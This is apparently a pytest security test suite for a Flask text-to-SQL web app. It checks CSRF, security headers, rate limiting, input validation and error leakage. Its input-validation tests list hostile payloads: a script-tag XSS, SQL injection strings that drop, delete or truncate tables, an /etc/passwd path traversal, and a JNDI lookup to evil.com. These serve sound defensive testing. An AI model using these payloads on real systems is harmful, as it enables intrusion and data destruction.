"""
Comprehensive security tests for web application.
"""

import time
from unittest.mock import Mock, patch

import pytest
from flask import Flask
from sqlalchemy import create_engine, text

from sql_synthesizer.query_agent import QueryAgent
from sql_synthesizer.webapp import create_app


@pytest.fixture
def agent():
    """Create a test agent with SQLite database."""
    engine = create_engine("sqlite:///:memory:")
    # Create a test table
    with engine.connect() as conn:
        conn.execute(text("CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)"))
        conn.execute(text("INSERT INTO users (name) VALUES ('Alice'), ('Bob')"))
        conn.commit()

    return QueryAgent("sqlite:///:memory:")


@pytest.fixture
def app(agent):
    """Create Flask test app."""
    app = create_app(agent)
    app.config["TESTING"] = True
    app.config["WTF_CSRF_ENABLED"] = True  # Should be enabled by default
    return app


@pytest.fixture
def client(app):
    """Create test client."""
    return app.test_client()


class TestCSRFProtection:
    """Test CSRF protection implementation."""

    def test_csrf_token_required_for_post_forms(self, client):
        """Test that POST forms require CSRF token."""
        # POST without CSRF token should be rejected
        response = client.post("/", data={"question": "test query"})
        assert (
            response.status_code == 400
            or "csrf" in response.get_data(as_text=True).lower()
        )

    def test_csrf_token_included_in_forms(self, client):
        """Test that forms include CSRF tokens."""
        response = client.get("/")
        assert response.status_code == 200
        data = response.get_data(as_text=True)
        # Should include CSRF token in form
        assert "csrf_token" in data or 'name="csrf_token"' in data

    def test_api_endpoints_csrf_exempt(self, client):
        """Test that API endpoints are exempt from CSRF (use other auth)."""
        # API endpoints should use API keys or other auth, not CSRF
        response = client.post(
            "/api/query",
            json={"question": "SELECT COUNT(*) FROM users"},
            headers={"Content-Type": "application/json"},
        )
        # Should not fail due to CSRF (may fail due to other validation)
        assert (
            response.status_code != 400
            or "csrf" not in response.get_data(as_text=True).lower()
        )


class TestSecurityHeaders:
    """Test security headers implementation."""

    def test_content_security_policy_header(self, client):
        """Test that CSP header is properly configured."""
        response = client.get("/")
        csp = response.headers.get("Content-Security-Policy")
        assert csp is not None
        # Should be restrictive - no 'unsafe-eval', limited sources
        assert "unsafe-eval" not in csp
        assert "default-src 'self'" in csp

    def test_x_frame_options_header(self, client):
        """Test X-Frame-Options header to prevent clickjacking."""
        response = client.get("/")
        assert response.headers.get("X-Frame-Options") == "DENY"

    def test_x_content_type_options_header(self, client):
        """Test X-Content-Type-Options header."""
        response = client.get("/")
        assert response.headers.get("X-Content-Type-Options") == "nosniff"

    def test_x_xss_protection_header(self, client):
        """Test X-XSS-Protection header."""
        response = client.get("/")
        xss_protection = response.headers.get("X-XSS-Protection")
        assert xss_protection == "1; mode=block"

    def test_referrer_policy_header(self, client):
        """Test Referrer-Policy header."""
        response = client.get("/")
        referrer_policy = response.headers.get("Referrer-Policy")
        assert referrer_policy in ["strict-origin-when-cross-origin", "same-origin"]

    def test_strict_transport_security_header(self, client):
        """Test HSTS header for HTTPS."""
        # This should be configurable and enabled in production
        response = client.get("/")
        hsts = response.headers.get("Strict-Transport-Security")
        # Should either be present with valid value or configurable
        if hsts:
            assert "max-age=" in hsts


class TestRateLimiting:
    """Test rate limiting implementation."""

    def test_rate_limiting_on_api_endpoints(self, client):
        """Test rate limiting on API endpoints."""
        # Make multiple rapid requests
        responses = []
        for i in range(10):
            response = client.post(
                "/api/query",
                json={"question": f"SELECT {i}"},
                headers={"Content-Type": "application/json"},
            )
            responses.append(response)
            time.sleep(0.1)  # Small delay to avoid overwhelming

        # Should have rate limiting after several requests
        status_codes = [r.status_code for r in responses]
        # Either returns 429 (Too Many Requests) or has rate limiting headers
        has_rate_limiting = 429 in status_codes or any(
            r.headers.get("X-RateLimit-Remaining") is not None for r in responses
        )
        assert has_rate_limiting

    def test_rate_limiting_headers_present(self, client):
        """Test that rate limiting headers are present."""
        response = client.post(
            "/api/query",
            json={"question": "SELECT 1"},
            headers={"Content-Type": "application/json"},
        )

        # Should include rate limiting headers
        rate_limit_headers = [
            "X-RateLimit-Limit",
            "X-RateLimit-Remaining",
            "X-RateLimit-Reset",
        ]
        present_headers = [h for h in rate_limit_headers if response.headers.get(h)]
        assert len(present_headers) > 0  # At least one rate limit header


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_question_length_validation(self, client):
        """Test that overly long questions are rejected."""
        long_question = "SELECT * FROM users WHERE " + "a" * 10000

        response = client.post(
            "/api/query",
            json={"question": long_question},
            headers={"Content-Type": "application/json"},
        )

        assert response.status_code == 400
        error_data = response.get_json()
        assert "too long" in error_data.get("error", "").lower()

    def test_malicious_input_sanitization(self, client):
        """Test that malicious input is properly sanitized."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com}",  # Log4j-style injection
        ]

        for malicious_input in malicious_inputs:
            response = client.post("/", data={"question": malicious_input})

            # Response should not contain unescaped malicious content
            response_text = response.get_data(as_text=True)
            assert "<script>" not in response_text
            assert "DROP TABLE" not in response_text or "error" in response_text.lower()

    def test_json_input_validation(self, client):
        """Test validation of JSON input."""
        # Invalid JSON structure
        response = client.post(
            "/api/query",
            data='{"invalid": json}',
            headers={"Content-Type": "application/json"},
        )
        assert response.status_code == 400

        # Missing required fields
        response = client.post(
            "/api/query",
            json={"not_question": "test"},
            headers={"Content-Type": "application/json"},
        )
        # Should handle missing 'question' field gracefully
        assert response.status_code in [400, 422]

    def test_sql_injection_prevention(self, client):
        """Test that SQL injection attempts are prevented."""
        sql_injection_attempts = [
            "1'; DELETE FROM users; --",
            "1' UNION SELECT password FROM admin_users --",
            "1' OR '1'='1",
            "'; TRUNCATE TABLE users; --",
        ]

        for injection_attempt in sql_injection_attempts:
            response = client.post(
                "/api/query",
                json={"question": injection_attempt},
                headers={"Content-Type": "application/json"},
            )

            # Should either reject the input or handle it safely
            if response.status_code == 200:
                data = response.get_json()
                # Should not execute malicious SQL
                assert "DELETE" not in data.get("sql", "")
                assert "TRUNCATE" not in data.get("sql", "")


class TestErrorHandling:
    """Test secure error handling."""

    def test_error_messages_sanitized(self, client):
        """Test that error messages don't leak sensitive information."""
        # Trigger an error condition
        response = client.post(
            "/api/query",
            json={"question": "INVALID SQL SYNTAX HERE"},
            headers={"Content-Type": "application/json"},
        )

        if response.status_code >= 400:
            error_data = response.get_json() or {}
            error_message = error_data.get("error", "")

            # Should not contain sensitive information
            sensitive_info = [
                "password",
                "secret",
                "key",
                "token",
                "internal",
                "debug",
                "traceback",
                "/root/",
                "/home/",
                "localhost",
            ]

            for sensitive in sensitive_info:
                assert sensitive.lower() not in error_message.lower()

    def test_generic_error_responses(self, client):
        """Test that detailed errors are not exposed to users."""
        # Cause a server error
        with patch.object(
            client.application.agent,
            "query",
            side_effect=Exception("Internal database connection failed"),
        ):
            response = client.post("/", data={"question": "test"})

            response_text = response.get_data(as_text=True)
            # Should show generic error, not detailed exception
            assert "Internal database connection failed" not in response_text
            assert "error" in response_text.lower() or response.status_code >= 400


class TestAPIKeySecurity:
    """Test API key based security (if implemented)."""

    def test_api_key_required_for_sensitive_operations(self, client):
        """Test that API keys are required for sensitive operations."""
        # This test assumes API key authentication is implemented
        # If not implemented, this should be a reminder to add it

        # Try to access admin/sensitive endpoint without API key
        response = client.get("/metrics")  # Metrics endpoint might be sensitive

        # Metrics should either be protected or have rate limiting
        assert response.status_code in [
            200,
            401,
            403,
        ] or "rate" in response.headers.get("X-RateLimit-Remaining", "")

    def test_api_key_validation(self, client):
        """Test API key validation if implemented."""
        # Try with invalid API key
        headers = {"X-API-Key": "invalid-key-12345"}
        response = client.post(
            "/api/query",
            json={"question": "SELECT 1"},
            headers={**headers, "Content-Type": "application/json"},
        )

        # If API keys are implemented, should reject invalid keys
        # If not implemented, this passes as a reminder to implement
        assert response.status_code in [200, 401, 403]


class TestConfigurationSecurity:
    """Test security-related configuration."""

    def test_debug_mode_disabled_in_production(self, app):
        """Test that debug mode is disabled."""
        # Debug mode should be disabled in production
        assert not app.debug
        assert not app.config.get("DEBUG", False)

    def test_secret_key_configured(self, app):
        """Test that Flask secret key is configured for CSRF protection."""
        # Secret key should be set for session management and CSRF
        secret_key = app.config.get("SECRET_KEY")
        if secret_key:
            assert len(secret_key) >= 16  # Reasonable minimum length
            assert secret_key != "dev"  # Not a default/weak key

    def test_security_config_from_environment(self):
        """Test that security settings can be configured via environment."""
        from sql_synthesizer.config import Config

        # Security settings should be configurable
        config = Config()
        config_dict = config.as_dict()

        # Should have security-related configuration options
        security_keys = ["webapp_port", "database_timeout", "openai_timeout"]
        for key in security_keys:
            assert key in config_dict


# Helper function for tests that need text import
def setup_test_db():
    """Set up test database with sample data."""
    from sqlalchemy import text

    engine = create_engine("sqlite:///:memory:")
    with engine.connect() as conn:
        conn.execute(text("CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)"))
        conn.execute(text("INSERT INTO users (name) VALUES ('Alice'), ('Bob')"))
        conn.commit()
    return engine
